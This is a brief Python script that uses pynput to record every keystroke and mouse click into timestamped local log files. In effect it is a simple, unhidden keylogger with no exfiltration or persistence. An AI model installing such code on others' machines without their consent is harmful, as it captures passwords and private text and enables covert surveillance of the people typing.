import os
from datetime import datetime
from pynput import keyboard, mouse

log_file = None

def on_click(x, y, button, pressed):
    if pressed:
        log(f"Mouse button {button} was clicked at ({x}, {y})")

def on_press(key):
    try:
        log(f"Key {key.char} was pressed")
    except AttributeError:
        log(f"Special key {key} was pressed")

def log(message):
    global log_file

    if log_file is None:
        # Get the current time in a formatted string
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

        # Create the log directory if it doesn't exist
        log_dir = "logs"
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)

        # Create a new log file with a unique name
        log_file = f"{log_dir}/log_{timestamp}.txt"

    with open(log_file, "a") as f:
        f.write(message + "\n")

# Create mouse and keyboard listeners
mouse_listener = mouse.Listener(on_click=on_click)
keyboard_listener = keyboard.Listener(on_press=on_press)

# Start the listeners
mouse_listener.start()
keyboard_listener.start()

# Wait for the listeners to finish
mouse_listener.join()
keyboard_listener.join()

# Reset the log file so a new one will be created on the next run
log_file = None
